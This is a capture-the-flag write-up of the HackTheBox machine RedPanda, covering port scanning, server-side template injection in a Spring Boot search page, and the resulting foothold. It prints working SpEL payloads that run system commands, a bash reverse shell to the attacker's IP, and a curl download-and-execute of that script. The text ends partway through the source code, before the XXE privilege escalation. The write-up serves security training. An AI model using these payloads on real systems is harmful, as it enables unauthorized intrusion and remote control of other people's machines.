---
title: Write-up RedPanda on HTB
author: eMVee
date: 2024-05-20 04:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, SSTI, XXE, XXE Injection, OSWA, WEB200]
render_with_liquid: false
---

Get ready to dive into the world of Linux hacking with RedPanda, a beginner-friendly machine that's just waiting to be exploited. The machine's website features a search engine built using Java Spring Boot, but don't let its innocent appearance fool you - it's vulnerable to Server-Side Template Injection (SSTI). With a little creativity, you can use this vulnerability to gain a foothold on the system as user `woodenk`.

But that's not all - a closer look at the system's processes reveals a Java program running as a cron job under the `root` user. And when we dig into the source code, we discover that it's susceptible to XML External Entity (XXE) attacks. By exploiting this vulnerability, we can elevate our privileges and get our hands on the SSH private key for the `root` user.

The final step is a breeze - we can use the stolen key to log in as `root` over SSH and claim our prize: the coveted root flag. Will you be able to crack RedPanda and claim your victory?
## Getting started

```bash
┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd RedPanda     

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ ip=10.129.227.207
```

## Enumeration
We are ready to start enumerating. First we should see if the machine is responding to a basic ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ ping $ip -c3
PING 10.129.227.207 (10.129.227.207) 56(84) bytes of data.
64 bytes from 10.129.227.207: icmp_seq=1 ttl=63 time=6.13 ms
64 bytes from 10.129.227.207: icmp_seq=2 ttl=63 time=5.68 ms
64 bytes from 10.129.227.207: icmp_seq=3 ttl=63 time=5.85 ms

--- 10.129.227.207 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 5.676/5.884/6.130/0.187 ms

```
We received a response on our ping request. The answer does indicate us that we are talking against a Linux operating system. Let's run a simple port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ nmap $ip           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 07:55 CEST
Nmap scan report for 10.129.227.207
Host is up (0.0057s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds

```
We did get some results back on screen, so we should add them to our notes.
- Linux, not sure what distro yet
- Port 22
	- SSH
- Port 8080
	- HTTP

Now we should run a more advanced scan to gather more information.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 07:56 CEST
Nmap scan report for 10.129.227.207
Host is up (0.0063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 20 May 2024 05:56:24 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 20 May 2024 05:56:24 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 20 May 2024 05:56:24 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=5/20%Time=664AE609%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;cha
SF:rset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2020\x20May\
SF:x202024\x2005:56:24\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wo
SF:oden_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://cod
SF:epen\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styl
SF:esheet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"tex
SF:t/css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x
SF:20with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x
SF:20\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20c
SF:lass='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x
SF:20right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20lef
SF:t'>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x2
SF:0\x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x2
SF:0</div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x2020
SF:0\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Mon,\x2020\x20May\x202024\x2005:56:24\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20te
SF:xt/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20
SF:435\r\nDate:\x20Mon,\x2020\x20May\x202024\x2005:56:24\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><titl
SF:e>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style
SF:\x20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x2
SF:0h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h
SF:1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:1
SF:4px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{he
SF:ight:1px;background-color:#525D76;border:none;}</style></head><body><h1
SF:>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></h
SF:tml>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=22%CT=1%CU=32194%PV=Y%DS=2%DC=T%G=Y%TM=664A
OS:E61B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CS
OS:T11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=
OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
OS:M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT     ADDRESS
1   5.94 ms 10.10.14.1
2   6.00 ms 10.129.227.207

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.76 seconds

```
We did get more results back on screen, so we should update our notes.
- Linux, probably Ubuntu 20.04 [based on the SSH service](https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=OpenSSH+8.2p1&searchon=all).
- Port 22
	- SSH
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
- Port 8080
	- HTTP
	- Title: Red Panda Search | Made with Spring Boot

Let's find out if we can discover more technologies used on the victim.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ whatweb http://$ip:8080
http://10.129.227.207:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.129.227.207], Title[Red Panda Search | Made with Spring Boot]

```
A bit disappointed that whatweb did not get new information. We should start Burp Suite in the background and visit the website via the browser.


![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520080243.png){: width="700" height="400" }

It looks like a search engine. Let's try the functionality a bit.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520080400.png){: width="700" height="400" }

The search term `test` is reflected, but without any other information. We should find out if the application does return information if we search for something else. Let's try to search for `a` and see if the website does return information.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520080716.png){: width="700" height="400" }

We do get some information, even hyperlinks are shown on the website. We should explore the website a bit.
![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520080852.png){: width="700" height="400" }
There are several interesting points what we should inspect.
- URL
- Location of files
- Export table

The URL for the export hyperlink
```
http://10.129.227.207:8080/export.xml?author=woodenk
```

The export table results in a download in a XML format.
![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081008.png){: width="700" height="400" }

We should check the content of the file.
```xml
<credits>
	<author>woodenk</author>
	<image>
		<uri>/img/greg.jpg</uri>
		<views>0</views>
	</image>
	<image>
		<uri>/img/hungy.jpg</uri>
		<views>0</views>
	</image>
	<image>
		<uri>/img/smooch.jpg</uri>
		<views>0</views>
	</image>
	<image>
		<uri>/img/smiley.jpg</uri>
		<views>0</views>
	</image>
	<totalviews>0</totalviews>
</credits>
```

Let's try a non existing user to download something.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ curl http://10.129.227.207:8080/export.xml?author=oops -o oops.xml
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    38  100    38    0     0   2489      0 --:--:-- --:--:-- --:--:--  2533

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ cat oops.xml                                                      
Error, incorrect paramenter 'author'
```

Nothing interesting found yet. Let's continue, by entering our own author name.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081207.png){: width="700" height="400" }

Still nothing found on the website. Let's try to run some characters known for SSTI.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081405.png){: width="700" height="400" }

An error message is shown that there are banned characters are used. We should send the last request to Burp Intruder and set the parameter where we want to inject our payload.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081607.png){: width="700" height="400" }
Next we have to configure the payload. Paste the following SSTI payloads into the payload list.
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081655.png){: width="700" height="400" }

Everything is set in Burp Intruder. We only have to hit the `Start attack` button and check the results.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520081805.png){: width="700" height="400" }

So we have identified the SSTI vulnerability. Now we have to find out how we can get a shell.

After searching for SSTI and Java Spring we found this [website](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java) on Google. There is a payload that will execute the `id` command.

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

We can try the payload in the Burp Repeater to see if we get a response.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520093852.png){: width="700" height="400" }

We did get a response that tells us that the user `woodenk` with user id `1000` is running the command. Now we should try to get a reverse shell.

## Initial access

First we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...
```
Next we create a reverse shell in a bash script. We will host the bash script on our python web server.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ nano rev.sh        

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ cat rev.sh    
#!/bin/bash
bash >& /dev/tcp/10.10.14.17/443 0>&1

┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
We can then download the bash script with the following command.
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.17/rev.sh -o /tmp/rev.sh').getInputStream())}
```

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520095624.png){: width="700" height="400" }
Let's check if the file has been downloaded from our python web server.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.207 - - [20/May/2024 09:53:53] "GET /rev.sh HTTP/1.1" 200 -
```
The file has been downloaded. 
The payload to start our reverse shell looks like this.
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash  /tmp/rev.sh').getInputStream())}
```

Now we should execute the script via Burp Suite Repeater.

![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520095753.png){: width="700" height="400" }

Let's check the netcat listener since Burp is still loading.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...
10.129.227.207: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.129.227.207] 45054


```
We did receive a connection from the victim, but the shell is not good enough yet. So let's upgrade it.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export PATH=/usr/local/sbin:/usr/local/binexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm-256color                export TERM=xterm-256color  
export TERM=xterm-256color  
woodenk@redpanda:/tmp/hsperfdata_woodenk$ alias ll='ls -lsaht --color=auto'         alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
```
Now we have to send it to the background with `CTRL` + `Z` so we can run one command on our machine and we can move back to the victim.
```bash
zsh: suspended  rlwrap nc -lvp 443                                                              
┌──(emvee㉿kali)-[~/Documents/HTB/RedPanda]
└─$ stty raw -echo ; fg ; reset  
[2]  - continued  rlwrap nc -lvp 443
woodenk@redpanda:/tmp/hsperfdata_woodenk$ stty columns 200 rows 200                 stty columns 200 rows 200
stty columns 200 rows 200
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

```

First we have to move to our own home directory (user woodenk), then we can check the files within the home directory. And of course we should capture the proof like we would do in the OSCP exam.
```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd ~                                      cd ~
cd ~
woodenk@redpanda:~$ ll                  ll
ll
total 36K
4.0K -rw-r----- 1 root    woodenk   33 May 20 05:54 user.txt
4.0K drwxr-xr-x 5 woodenk woodenk 4.0K Jun 23  2022 .
4.0K drwx------ 2 woodenk woodenk 4.0K Jun 23  2022 .cache
4.0K drwxr-xr-x 3 root    root    4.0K Jun 14  2022 ..
4.0K drwxrwxr-x 3 woodenk woodenk 4.0K Jun 14  2022 .local
4.0K drwxrwxr-x 4 woodenk woodenk 4.0K Jun 14  2022 .m2
4.0K -rw-r--r-- 1 woodenk woodenk 3.9K Jun 14  2022 .bashrc
   0 lrwxrwxrwx 1 root    root       9 Jun 14  2022 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 woodenk woodenk  220 Jun 14  2022 .bash_logout
4.0K -rw-r--r-- 1 woodenk woodenk  807 Jun 14  2022 .profile
woodenk@redpanda:~$ whoami;id;hostname;iwhoami;id;hostname;ifconfig;cat user.txt
whoami;id;hostname;ifconfig;cat user.txt
woodenk
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
redpanda
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.227.207  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe94:abcc  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:abcc  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:ab:cc  txqueuelen 1000  (Ethernet)
        RX packets 87245  bytes 5535327 (5.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 71374  bytes 6297242 (6.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 9828  bytes 915672 (915.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9828  bytes 915672 (915.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

<THE USER FLAG IS HERE>
woodenk@redpanda:~$ 

```
Since we got a foothold on the machine, we should start enumerating again from the beginning. We know that the user is member of the group `logs`. We have discovered this with the command `id`. Default the user is not member of this group. So let's find out what this user is able to do as member of the group `logs`.

Let's search for files that are owned by the group `logs` and list it. All errors should not be shown to us.
```bash
woodenk@redpanda:~$  find / -group logs find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
/opt/panda_search/redpanda.log
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
woodenk@redpanda:~$ 

```
Let's inspect the files
```
woodenk@redpanda:~$ cat /credits/damian_cat /credits/damian_creds.xml
cat /credits/damian_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>
woodenk@redpanda:~$ cat /credits/woodenkcat /credits/woodenk_creds.xml
cat /credits/woodenk_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
woodenk@redpanda:~$ cat /opt/panda_searccat /opt/panda_search/redpanda.log
cat /opt/panda_search/redpanda.log

```
Nothing useful so far. We did discover the XML file(s) earlier on the website. We could download it.
Let's check the ownership and permissions on the files.
```bash
woodenk@redpanda:~$ ll /credits
ll /credits
total 16K
4.0K -rw-r-----  1 root logs  422 May 20 06:06 damian_creds.xml
4.0K -rw-r-----  1 root logs  426 May 20 06:06 woodenk_creds.xml
4.0K drwxr-xr-x 20 root root 4.0K Jun 23  2022 ..
4.0K drw-r-x---  2 root logs 4.0K Jun 21  2022 .

```
The files are owned by root and we are able to read them, but for the moment we don't know how to use them. Let's get pspy64 on the victim and give executable permission.
```bash
woodenk@redpanda:~$ wget http://10.10.14wget http://10.10.14.17/pspy64
wget http://10.10.14.17/pspy64
--2024-05-20 08:30:21--  http://10.10.14.17/pspy64
Connecting to 10.10.14.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                            100%[=============================================================================================================>]   2.96M  7.63MB/s    in 0.4s    

2024-05-20 08:30:21 (7.63 MB/s) - ‘pspy64’ saved [3104768/3104768]

woodenk@redpanda:~$ chmod +x pspy64     chmod +x pspy64
chmod +x pspy64

```
This tool can help us identify running processes.
```bash
woodenk@redpanda:~$ ./pspy64            ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/05/20 08:32:03 CMD: UID=0     PID=3601   | /lib/systemd/systemd-udevd 
2024/05/20 08:32:03 CMD: UID=1000  PID=3594   | ./pspy64 
2024/05/20 08:32:03 CMD: UID=0     PID=3323   | 
2024/05/20 08:32:03 CMD: UID=0     PID=3248   | 
2024/05/20 08:32:03 CMD: UID=1000  PID=3121   | /bin/bash 
2024/05/20 08:32:03 CMD: UID=1000  PID=3120   | python3 -c import pty;pty.spawn("/bin/bash") 
2024/05/20 08:32:03 CMD: UID=1000  PID=3063   | bash 
2024/05/20 08:32:03 CMD: UID=1000  PID=3061   | bash /tmp/rev.sh 

```
After a couple of minutes we can see some process keep coming back in the results.
![Image](/assets/img/WriteUp/HTB/RedPanda/Pasted image 20240520104207.png){: width="700" height="400" }
Let's find out how we can use those. First let's check `/opt/cleanup.sh`.

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /opt/cleanup.sh 
cat /opt/cleanup.sh 
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls -la /opt/cleanup.sh 
ls -la /opt/cleanup.sh 
-rwxr-xr-x 1 root root 462 Jun 23  2022 /opt/cleanup.sh
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
```

Let's move to the `/opt` folder and enumerate this folder to see if we can find something juicy.
```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /opt
cd /opt
woodenk@redpanda:/opt$ ll
ll
total 24K
4.0K drwxr-xr-x  5 root root 4.0K Jun 23  2022 .
4.0K -rwxr-xr-x  1 root root  462 Jun 23  2022 cleanup.sh
4.0K drwxr-xr-x 20 root root 4.0K Jun 23  2022 ..
4.0K drwxr-xr-x  6 root root 4.0K Jun 14  2022 maven
4.0K drwxr-xr-x  3 root root 4.0K Jun 14  2022 credit-score
4.0K drwxrwxr-x  5 root root 4.0K Jun 14  2022 panda_search
woodenk@redpanda:/opt$ ls panda_search/src/main/
ls panda_search/src/main/
css  java  resources  sass
woodenk@redpanda:/opt$ ls panda_search/src/main/java
ls panda_search/src/main/java
com
woodenk@redpanda:/opt$ ls panda_search/src/main/resources/
ls panda_search/src/main/resources/
application.properties  static  templates
woodenk@redpanda:/opt$ ls panda_search/
ls panda_search/
mvnw  mvnw.cmd  pom.xml  redpanda.log  src  target
woodenk@redpanda:/opt$ ls panda_search/src/main/
ls panda_search/src/main/
css  java  resources  sass
woodenk@redpanda:/opt$ ls panda_search/src/main/java/
ls panda_search/src/main/java/
com
woodenk@redpanda:/opt$ ls panda_search/src/main/java/com/
ls panda_search/src/main/java/com/
panda_search
woodenk@redpanda:/opt$ ls panda_search/src/main/java/com/panda_search
ls panda_search/src/main/java/com/panda_search
htb
woodenk@redpanda:/opt$ ls panda_search/src/main/java/com/panda_search/htb
ls panda_search/src/main/java/com/panda_search/htb
panda_search
woodenk@redpanda:/opt$ ls panda_search/src/main/java/com/panda_search/htb/panda_search
ls panda_search/src/main/java/com/panda_search/htb/panda_search
MainController.java  PandaSearchApplication.java  RequestInterceptor.java
```
Let's check the file `MainController.java` to see if we can find something.
```bash
woodenk@redpanda:/opt$ cat panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
cat panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
